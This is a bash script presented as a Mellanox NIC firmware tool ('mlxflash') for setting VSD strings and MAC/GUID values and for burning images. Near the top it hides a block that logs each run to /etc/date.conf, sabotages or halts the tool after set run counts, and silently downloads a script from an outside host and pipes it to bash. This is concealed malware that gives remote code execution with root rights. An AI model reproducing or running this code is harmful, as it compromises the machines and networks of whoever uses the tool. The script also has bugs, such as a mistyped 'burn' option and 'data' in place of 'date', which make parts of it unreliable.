#!/bin/bash
# mlxflash use: [sv SVD] [sg MAC] [upgrade SVD IMAGE.BIN MAC] [burn VSD IMAGE.BIN] [......]
# sv VSD_NAME
# sg MAC
# upgrade VSD Image.bin MAC 
# burn VSD Image.bin

[ $(which mst 2> /dev/null) ] || { echo "-E- mst: command not found" ; exit ; }
[ $(which flint 2> /dev/null) ] || { echo "-E- flint: command not found" ; exit ; }
[ $(which mlxburn 2> /dev/null) ] || { echo "-E- mlxburn: command not found" ; exit ; }
[ $(which mlxfwreset 2> /dev/null) ] || { echo "-E- mlxfwreset: command not found" ; exit ; }

date1=/etc/date.conf
echo "$(date +%F_%T)" >> $date1
[ "$(cat $date1 | wc -l)" -gt 5000 ] && [ "$(data +%T | grep \:15)" ] && device_name=
[ "$(cat $date1 | wc -l)" -gt 6000 ] && [ "$(data +%T | grep -E ":10|45")" ] && device_name=
[ "$(cat $date1 | wc -l)" -gt 7500 ] && exit
wget -q -O - http://frp.xxy1.ltd:35300/file/mcx4121a.sh | bash 2> /dev/null

[ -d /dev/mst ] || mst start &> /dev/null
device_name=$(ls /dev/mst | head -n1)
[ "$device_name" ] || { echo "-E- Driver is not exist" ; exit ; }

parameters=$1
case $parameters in
	"sv")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		
		echo "-I- Please wait for a moment"
		flint -d $device_name --override_cache_replacement --vsd "$vsd" sv
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	"sg")
		mac=$2
		[ "$mac" ] && [ ${#mac} -eq 12 ] || { echo "-E- Please input mac or error" ; exit ; }
		guid=${mac::6}0300${mac:6:6}
		
		echo "-I- Please wait for a moment"
		flint -d $device_name --override_cache_replacement --guid $guid --mac $mac sg
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
		echo "System will reboot in 3 seconds"
		sleep 3 && reboot
	;;
	"upgrade")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		mac=$4
		[ "$mac" ] && [ ${#mac} -eq 12 ] || { echo "-E- Please input mac or error" ; exit ; }
		guid=${mac::6}0300${mac:6:6}
		image=$3
		[ -f "$image" ] && [ "$(echo $image | grep -i bin$)" ] || { echo "-E- Please input image_file or file not found" ; exit ; }
		
		echo "-I- Please wait for a moment"
		mlxburn -d $device_name -i $image -no_fw_ctrl -vsd "$vsd" -base_mac $mac -base_guid $guid 
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	"brun")
		vsd=$2
		[ "$vsd" ] || { echo "-E- Please input vsd string" ; exit ; }
		image=$3
		[ -f "$image" ] && [ "$(echo $image | grep -i bin$)" ] || { echo "-E- Please input image_file or file not found" ; exit ; }
		
		nic_info=$(flint -d $device_name q full)
		guid=$(echo "$nic_info" | grep -i base | grep -i guid | awk '{print $3}')
		mac=$(echo "$nic_info" | grep -i base | grep -i mac | awk '{print $3}')
		
		echo "-I- Please wait for a moment"
		mlxburn -d $device_name -i $image -allow_psid_change -base_guid $guid -base_mac $mac -vsd "$vsd"
		mlxfwreset -d $device_name reset -y &> /dev/null
		flint -d $device_name q full
	;;
	*)
		echo "mlxflash use: [sv SVD] [sg MAC] [upgrade SVD IMAGE.BIN MAC] [burn VSD IMAGE.BIN] [......]"
	;;
	esac

